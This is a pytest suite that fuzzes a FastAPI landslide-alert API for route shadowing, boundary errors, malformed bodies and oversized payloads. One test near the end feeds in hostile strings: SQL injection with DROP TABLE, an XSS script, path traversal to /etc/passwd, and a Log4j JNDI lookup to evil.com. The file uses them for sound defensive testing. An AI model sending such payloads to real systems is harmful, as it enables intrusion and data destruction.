"""
M2 Challenger 1: Adversarial API Fuzzing, Route Shadowing & Boundary Stress Test Suite.

Adversarially tests:
1. Static vs Parameterized Route Shadowing & Trailing Slashes:
   - Verifies static routes (/alerts/history, /alerts/deliveries/audit, /alerts/worker/status,
     /alerts/evaluate, /alerts/test-dispatch) are NEVER intercepted by /{alert_id}.
   - Trailing slash variations (/history/, /audit/, /status/, etc.) with and without redirect following.
   - HTTP method fuzzing (POST/PUT/DELETE on GET routes; GET on POST routes).
2. Reserved Keyword Collision & Bogus Subpaths:
   - GET /{alert_id} where alert_id in {"history", "deliveries", "worker", "evaluate", "test-dispatch"}
     both lower-case and UPPER-CASE, confirming 404 isolation.
   - POST /{alert_id}/acknowledge and POST /{alert_id}/resolve with reserved keywords, confirming 404 isolation.
   - Bogus subpaths on static routes (e.g. /history/extra, /worker/bogus, /deliveries/bogus) confirming 404.
3. Boundary & Numeric Parameter Fuzzing:
   - Pagination limit boundary violations: limit=0, -1, -999, 501, 1000, 0.5, "abc" -> 422.
   - Pagination limit boundary valid points: limit=1, 500 -> 200.
   - Pagination offset boundary violations: offset=-1, -500, "xyz" -> 422.
   - Pagination offset extreme valid: offset=0, offset=999999 -> 200.
   - Query filter enums & injection fuzzing: status, severity, channel with invalid values and SQL injection attempts.
4. Malformed Payloads & Extreme Payloads:
   - Malformed / truncated / syntax-invalid JSON -> 422.
   - Schema type violations (arrays/dicts for string fields, non-lists for channels) -> 422.
   - Giant payload stress test: 256KB to 500KB string payloads to /acknowledge, /resolve, /test-dispatch.
   - XSS strings (<script>alert(1)</script>) and Path Traversal strings in identifiers.
"""
import pytest
import asyncio
from datetime import datetime, timezone, timedelta
from httpx import AsyncClient, ASGITransport

from app.main import app
from app.services.alert_service import alert_service
from app.database import (
    clear_delivery_audit_records,
    add_delivery_audit_record,
    get_delivery_audit_records,
)


@pytest.fixture(autouse=True)
def clean_environment():
    """Ensure clean isolated state before and after each adversarial test."""
    clear_delivery_audit_records()
    alert_service._active_alerts.clear()
    alert_service._historical_alerts.clear()
    alert_service._sector_cooldowns.clear()
    yield
    clear_delivery_audit_records()
    alert_service._active_alerts.clear()
    alert_service._historical_alerts.clear()
    alert_service._sector_cooldowns.clear()


def make_test_alert(
    alert_id: str = "ALT-CHALLENGE-001",
    zone_id: str = "Z-SHL-01",
    severity: str = "high",
    status: str = "active"
) -> dict:
    now_iso = datetime.now(timezone.utc).isoformat()
    return {
        "id": alert_id,
        "zone_id": zone_id,
        "zone_name": "Shillong East Ridge",
        "severity": severity,
        "risk_level": severity.capitalize(),
        "status": status,
        "factor_of_safety": 1.05,
        "probability": 0.82,
        "failure_mode": "Adversarial Stress Test",
        "breach_reasons": ["Geotechnical factor of safety breach"],
        "title": "CHALLENGE WARNING: Stress Test",
        "message_en": "Adversarial test alert advisory in English.",
        "message_hi": "प्रतिकूल परीक्षण चेतावनी।",
        "message_as": "প্ৰতিকূল পৰীক্ষা সতৰ্কবাণী।",
        "triggered_at": now_iso,
        "timestamp": now_iso,
        "cooldown_until": (datetime.now(timezone.utc) + timedelta(minutes=15)).isoformat(),
        "acknowledged_at": None,
        "acknowledged_by": None,
        "notes": None,
        "resolved_at": None,
        "resolved_by": None,
        "resolution_note": None,
        "resolution_notes": None,
    }


# =============================================================================
# CHALLENGE 1: Static vs Parameterized Route Shadowing & Trailing Slashes
# =============================================================================

@pytest.mark.asyncio
async def test_route_shadowing_history_not_intercepted_by_alert_id():
    """
    Stress: Call GET /api/v1/alerts/history.
    Must return a list of historical alerts (200), NOT be captured as alert_id='history'.
    """
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as ac:
        resp = await ac.get("/api/v1/alerts/history")
        assert resp.status_code == 200
        assert isinstance(resp.json(), list)
        assert "X-Total-Count" in resp.headers


@pytest.mark.asyncio
async def test_route_shadowing_audit_not_intercepted_by_alert_id():
    """
    Stress: Call GET /api/v1/alerts/deliveries/audit.
    Must return a list of delivery audit records (200), NOT be captured as alert_id='deliveries'.
    """
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as ac:
        resp = await ac.get("/api/v1/alerts/deliveries/audit")
        assert resp.status_code == 200
        assert isinstance(resp.json(), list)


@pytest.mark.asyncio
async def test_route_shadowing_worker_status_not_intercepted_by_alert_id():
    """
    Stress: Call GET /api/v1/alerts/worker/status.
    Must return worker telemetry dictionary (200), NOT be captured as alert_id='worker'.
    """
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as ac:
        resp = await ac.get("/api/v1/alerts/worker/status")
        assert resp.status_code == 200
        data = resp.json()
        assert "status" in data
        assert "is_running" in data
        assert "poll_count" in data


@pytest.mark.asyncio
async def test_route_shadowing_post_actions_not_intercepted_by_alert_id():
    """
    Stress: Call POST /api/v1/alerts/evaluate and POST /api/v1/alerts/test-dispatch.
    Must return valid operational responses (200), NOT 404 or 405.
    """
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as ac:
        resp_eval = await ac.post("/api/v1/alerts/evaluate")
        assert resp_eval.status_code == 200
        assert resp_eval.json()["status"] == "evaluated"

        resp_disp = await ac.post("/api/v1/alerts/test-dispatch", json={})
        assert resp_disp.status_code == 200
        assert resp_disp.json()["status"] == "dispatched"


@pytest.mark.asyncio
@pytest.mark.parametrize("path", [
    "/api/v1/alerts/history/",
    "/api/v1/alerts/deliveries/audit/",
    "/api/v1/alerts/worker/status/",
])
async def test_trailing_slashes_get_static_routes(path):
    """
    Stress: Trailing slashes on GET static routes with redirect following.
    Must resolve cleanly to 200 and return proper schema (never 500 or captured by single alert).
    """
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test", follow_redirects=True) as ac:
        resp = await ac.get(path)
        assert resp.status_code == 200


@pytest.mark.asyncio
@pytest.mark.parametrize("path,method,body", [
    ("/api/v1/alerts/evaluate/", "post", {}),
    ("/api/v1/alerts/test-dispatch/", "post", {}),
    ("/api/v1/alerts/worker/pause/", "post", {}),
    ("/api/v1/alerts/worker/resume/", "post", {}),
])
async def test_trailing_slashes_post_static_routes(path, method, body):
    """
    Stress: Trailing slashes on POST static routes with redirect following.
    Must resolve cleanly without crashing or route interception.
    """
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test", follow_redirects=True) as ac:
        resp = await ac.request(method, path, json=body)
        assert resp.status_code in [200, 307, 308]


@pytest.mark.asyncio
@pytest.mark.parametrize("method,path", [
    ("post", "/api/v1/alerts/history"),
    ("put", "/api/v1/alerts/history"),
    ("delete", "/api/v1/alerts/history"),
    ("post", "/api/v1/alerts/deliveries/audit"),
    ("put", "/api/v1/alerts/deliveries/audit"),
    ("delete", "/api/v1/alerts/deliveries/audit"),
    ("post", "/api/v1/alerts/worker/status"),
    ("get", "/api/v1/alerts/worker/pause"),
    ("get", "/api/v1/alerts/worker/resume"),
])
async def test_unsupported_http_methods_on_static_routes(method, path):
    """
    Stress: Unsupported HTTP verbs on static routes must return 405 Method Not Allowed.
    """
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as ac:
        resp = await ac.request(method, path)
        assert resp.status_code == 405


@pytest.mark.asyncio
@pytest.mark.parametrize("path", [
    "/api/v1/alerts/evaluate",
    "/api/v1/alerts/test-dispatch",
])
async def test_get_on_post_only_evaluation_and_dispatch(path):
    """
    Stress: Calling GET on evaluate or test-dispatch.
    Since /{alert_id} is registered for GET, calling GET /evaluate matches /{alert_id}.
    The reserved keyword guard MUST catch it and return 404 (Alert 'evaluate' not found),
    NEVER 500 and NEVER exposing internal logic or treating 'evaluate' as a valid alert ID.
    """
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as ac:
        resp = await ac.get(path)
        assert resp.status_code == 404
        assert "not found" in resp.json()["detail"].lower()


# =============================================================================
# CHALLENGE 2: Reserved Keyword Collision & Subpath Fuzzing
# =============================================================================

@pytest.mark.asyncio
@pytest.mark.parametrize("reserved_word", [
    "history",
    "HISTORY",
    "History",
    "deliveries",
    "DELIVERIES",
    "Deliveries",
    "worker",
    "WORKER",
    "Worker",
    "evaluate",
    "EVALUATE",
    "Evaluate",
    "test-dispatch",
    "TEST-DISPATCH",
    "Test-Dispatch",
])
async def test_get_single_alert_reserved_keyword_isolation(reserved_word):
    """
    Stress: Querying reserved keywords as alert_id via GET /api/v1/alerts/{alert_id}.
    Even if an alert somehow had such an ID, or a user probes the endpoint,
    it must return 404 (or static list for lowercase history).
    Specifically, deliveries, worker, evaluate, test-dispatch and uppercase variants must 404.
    """
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as ac:
        resp = await ac.get(f"/api/v1/alerts/{reserved_word}")
        if reserved_word == "history":
            # Matches static route returning list
            assert resp.status_code == 200
            assert isinstance(resp.json(), list)
        else:
            # Must be isolated and return 404
            assert resp.status_code == 404


@pytest.mark.asyncio
@pytest.mark.parametrize("reserved_word", [
    "history", "HISTORY",
    "deliveries", "DELIVERIES",
    "worker", "WORKER",
    "evaluate", "EVALUATE",
    "test-dispatch", "TEST-DISPATCH"
])
@pytest.mark.parametrize("action", ["acknowledge", "resolve"])
async def test_parameterized_action_reserved_keyword_isolation(reserved_word, action):
    """
    Stress: Attempting to POST /alerts/{reserved_word}/acknowledge or resolve.
    Must be rejected with 404, never modifying state or throwing unhandled errors.
    """
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as ac:
        resp = await ac.post(f"/api/v1/alerts/{reserved_word}/{action}", json={})
        assert resp.status_code == 404
        assert "not found" in resp.json()["detail"].lower()


@pytest.mark.asyncio
@pytest.mark.parametrize("bogus_path", [
    "/api/v1/alerts/history/bogus",
    "/api/v1/alerts/history/deep/nested/path",
    "/api/v1/alerts/deliveries/bogus",
    "/api/v1/alerts/deliveries/audit/extra",
    "/api/v1/alerts/worker/bogus",
    "/api/v1/alerts/worker/status/extra",
    "/api/v1/alerts/evaluate/bogus",
    "/api/v1/alerts/test-dispatch/bogus",
])
async def test_bogus_suffixes_and_nested_paths_404(bogus_path):
    """
    Stress: Non-existent deep paths and bogus suffixes must return 404.
    """
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as ac:
        resp = await ac.get(bogus_path)
        assert resp.status_code in [404, 405]


# =============================================================================
# CHALLENGE 3: Boundary & Numeric Parameter Fuzzing
# =============================================================================

@pytest.mark.asyncio
@pytest.mark.parametrize("bad_limit", [0, -1, -500, -999999, 501, 502, 1000, 999999])
async def test_alerts_history_limit_boundary_violations(bad_limit):
    """
    Stress: limit must strictly satisfy 1 <= limit <= 500.
    Values 0, -1, 501, etc. must return HTTP 422 Unprocessable Entity.
    """
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as ac:
        resp = await ac.get(f"/api/v1/alerts/history?limit={bad_limit}")
        assert resp.status_code == 422


@pytest.mark.asyncio
@pytest.mark.parametrize("valid_limit", [1, 2, 50, 499, 500])
async def test_alerts_history_limit_boundary_valid_points(valid_limit):
    """
    Stress: Boundary valid limits: limit=1 and limit=500 must return 200.
    """
    alert = make_test_alert(status="resolved")
    alert_service._historical_alerts = [alert]
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as ac:
        resp = await ac.get(f"/api/v1/alerts/history?limit={valid_limit}")
        assert resp.status_code == 200
        assert len(resp.json()) <= valid_limit


@pytest.mark.asyncio
@pytest.mark.parametrize("bad_offset", [-1, -2, -100, -999999])
async def test_alerts_history_offset_negative_violations(bad_offset):
    """
    Stress: offset must satisfy ge=0. Negative values must return 422.
    """
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as ac:
        resp = await ac.get(f"/api/v1/alerts/history?offset={bad_offset}")
        assert resp.status_code == 422


@pytest.mark.asyncio
async def test_alerts_history_offset_extreme_value():
    """
    Stress: Huge offset (offset=999999) must return 200 with empty list, never crashing with IndexError.
    """
    alert = make_test_alert(status="resolved")
    alert_service._historical_alerts = [alert]
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as ac:
        resp = await ac.get("/api/v1/alerts/history?offset=999999")
        assert resp.status_code == 200
        assert resp.json() == []
        assert resp.headers.get("X-Total-Count") == "1"


@pytest.mark.asyncio
@pytest.mark.parametrize("bad_limit", [0, -1, -9999, 501, 1000])
async def test_audit_limit_boundary_violations(bad_limit):
    """
    Stress: Audit endpoint limit must strictly satisfy 1 <= limit <= 500.
    Violations must return 422.
    """
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as ac:
        resp = await ac.get(f"/api/v1/alerts/deliveries/audit?limit={bad_limit}")
        assert resp.status_code == 422


@pytest.mark.asyncio
@pytest.mark.parametrize("bad_offset", [-1, -50, -9999])
async def test_audit_offset_negative_violations(bad_offset):
    """
    Stress: Audit endpoint offset must satisfy ge=0. Negative values must return 422.
    """
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as ac:
        resp = await ac.get(f"/api/v1/alerts/deliveries/audit?offset={bad_offset}")
        assert resp.status_code == 422


@pytest.mark.asyncio
@pytest.mark.parametrize("param_type,query_str", [
    ("string_in_int", "limit=not_an_integer"),
    ("float_in_int", "limit=25.5"),
    ("string_in_offset", "offset=abc"),
    ("special_chars", "limit=@@!#$"),
])
async def test_pagination_type_mismatches(param_type, query_str):
    """
    Stress: Non-integer query parameters in limit/offset must return 422.
    """
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as ac:
        resp1 = await ac.get(f"/api/v1/alerts/history?{query_str}")
        assert resp1.status_code == 422

        resp2 = await ac.get(f"/api/v1/alerts/deliveries/audit?{query_str}")
        assert resp2.status_code == 422


@pytest.mark.asyncio
@pytest.mark.parametrize("bad_query", [
    "/api/v1/alerts?status=corrupted_status",
    "/api/v1/alerts?severity=apocalyptic",
    "/api/v1/alerts?refresh=not_a_boolean",
    "/api/v1/alerts/history?status=active",
    "/api/v1/alerts/history?status=corrupted",
    "/api/v1/alerts/history?severity=unknown_tier",
])
async def test_filter_enum_boundary_violations(bad_query):
    """
    Stress: Invalid enum / filter values must return 422 with descriptive error messages.
    """
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as ac:
        resp = await ac.get(bad_query)
        assert resp.status_code == 422


# =============================================================================
# CHALLENGE 4: Payload Injection, Type Violations & Malformed Data Fuzzing
# =============================================================================

@pytest.mark.asyncio
@pytest.mark.parametrize("endpoint", [
    "/api/v1/alerts/test-dispatch",
    "/api/v1/alerts/ALT-CHALLENGE-001/acknowledge",
    "/api/v1/alerts/ALT-CHALLENGE-001/resolve",
])
@pytest.mark.parametrize("malformed_body", [
    b"{",  # Truncated JSON
    b"{'single_quotes': 'not_valid_json'}",  # Invalid JSON quotes
    b"\x00\x01\xff\xfe",  # Binary garbage
    b"<xml><tag>payload</tag></xml>",  # XML payload
    b"not a json string at all",  # Plain text
])
async def test_malformed_json_payloads_yield_422(endpoint, malformed_body):
    """
    Stress: Malformed JSON syntax must be safely caught by FastAPI and return 422.
    Must never cause an unhandled 500 or crash the worker process.
    """
    alert = make_test_alert(alert_id="ALT-CHALLENGE-001")
    alert_service._active_alerts = [alert]

    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as ac:
        resp = await ac.post(
            endpoint,
            content=malformed_body,
            headers={"Content-Type": "application/json"}
        )
        assert resp.status_code == 422


@pytest.mark.asyncio
async def test_test_dispatch_type_violations_yield_422():
    """
    Stress: Passing invalid types to POST /api/v1/alerts/test-dispatch
    (e.g., dict or integer where list is required).
    """
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as ac:
        # channels as dict instead of list
        resp1 = await ac.post("/api/v1/alerts/test-dispatch", json={"channels": {"sms": True}})
        assert resp1.status_code == 422

        # channels as scalar int instead of list
        resp2 = await ac.post("/api/v1/alerts/test-dispatch", json={"channels": 12345})
        assert resp2.status_code == 422


@pytest.mark.asyncio
async def test_acknowledge_and_resolve_type_violations_yield_422():
    """
    Stress: Passing invalid types (e.g. array/dict for string fields).
    """
    alert = make_test_alert(alert_id="ALT-CHALLENGE-001")
    alert_service._active_alerts = [alert]

    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as ac:
        resp1 = await ac.post(
            "/api/v1/alerts/ALT-CHALLENGE-001/acknowledge",
            json={"acknowledged_by": ["list", "of", "names"]}
        )
        assert resp1.status_code == 422

        resp2 = await ac.post(
            "/api/v1/alerts/ALT-CHALLENGE-001/resolve",
            json={"resolution_note": {"complex": "object"}}
        )
        assert resp2.status_code == 422


@pytest.mark.asyncio
async def test_giant_payload_stress_acknowledge_and_resolve():
    """
    Stress: Pass a 256KB giant string payload to /acknowledge and /resolve.
    Must be handled gracefully without memory exhaustion or 500 error.
    """
    alert = make_test_alert(alert_id="ALT-GIANT-01")
    alert_service._active_alerts = [alert]

    giant_text = "A" * (256 * 1024)  # 256KB string

    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as ac:
        # Acknowledge with giant notes
        resp_ack = await ac.post(
            "/api/v1/alerts/ALT-GIANT-01/acknowledge",
            json={"acknowledged_by": "Stress Officer", "notes": giant_text}
        )
        assert resp_ack.status_code == 200
        data_ack = resp_ack.json()
        assert len(data_ack["notes"]) == 256 * 1024

        # Resolve with giant resolution_notes
        resp_res = await ac.post(
            "/api/v1/alerts/ALT-GIANT-01/resolve",
            json={"resolved_by": "Stress Admin", "resolution_notes": giant_text}
        )
        assert resp_res.status_code == 200
        data_res = resp_res.json()
        assert len(data_res["resolution_notes"]) == 256 * 1024


@pytest.mark.asyncio
async def test_giant_payload_stress_test_dispatch():
    """
    Stress: Pass a 256KB custom message to /test-dispatch.
    Must successfully format and simulate dispatch without crashing.
    """
    giant_msg = "DRILL_" + ("X" * (256 * 1024))

    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as ac:
        resp = await ac.post(
            "/api/v1/alerts/test-dispatch",
            json={"zone_id": "Z-SHL-01", "channels": ["sms"], "custom_message": giant_msg}
        )
        assert resp.status_code == 200
        data = resp.json()
        assert data["status"] == "dispatched"
        assert len(data["deliveries"]) == 1
        # Simulator preview is truncated or preserved without error
        assert "DRILL_" in data["deliveries"][0]["payload_preview"]


@pytest.mark.asyncio
@pytest.mark.parametrize("injection_string", [
    "' OR '1'='1",
    "'; DROP TABLE alerts; --",
    "<script>alert('xss')</script>",
    "../../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "${jndi:ldap://evil.com/a}",
])
async def test_adversarial_injection_strings_sanitization(injection_string):
    """
    Stress: Pass SQL injection, XSS, Path Traversal, and Log4j injection strings
    into alert_id and query filters. Must either return 404, 422, or safe 200 (empty).
    Must NEVER return 500 Internal Server Error.
    """
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as ac:
        # In alert_id
        resp_id = await ac.get(f"/api/v1/alerts/{injection_string}")
        assert resp_id.status_code in [404, 422]

        # In query parameters
        resp_filter = await ac.get(f"/api/v1/alerts/deliveries/audit?channel={injection_string}")
        assert resp_filter.status_code in [200, 422]
        if resp_filter.status_code == 200:
            assert resp_filter.json() == []


@pytest.mark.asyncio
async def test_nonexistent_and_double_action_lifecycle():
    """
    Stress: Nonexistent alert actions and double-resolution lifecycle.
    - Acknowledge nonexistent alert -> 404.
    - Resolve nonexistent alert -> 404.
    - Resolve existing alert once -> 200.
    - Resolve already-resolved alert second time -> 404.
    - Acknowledge already-resolved alert -> 404.
    """
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as ac:
        # Nonexistent
        resp1 = await ac.post("/api/v1/alerts/NONEXISTENT-9999/acknowledge", json={})
        assert resp1.status_code == 404

        resp2 = await ac.post("/api/v1/alerts/NONEXISTENT-9999/resolve", json={})
        assert resp2.status_code == 404

        # Seed active alert
        alert = make_test_alert(alert_id="ALT-DOUBLE-01")
        alert_service._active_alerts = [alert]

        # First resolution
        resp_res1 = await ac.post("/api/v1/alerts/ALT-DOUBLE-01/resolve", json={"resolved_by": "Officer"})
        assert resp_res1.status_code == 200
        assert resp_res1.json()["status"] == "resolved"

        # Second resolution must 404
        resp_res2 = await ac.post("/api/v1/alerts/ALT-DOUBLE-01/resolve", json={"resolved_by": "Officer"})
        assert resp_res2.status_code == 404

        # Acknowledge on resolved alert must 404
        resp_ack = await ac.post("/api/v1/alerts/ALT-DOUBLE-01/acknowledge", json={})
        assert resp_ack.status_code == 404
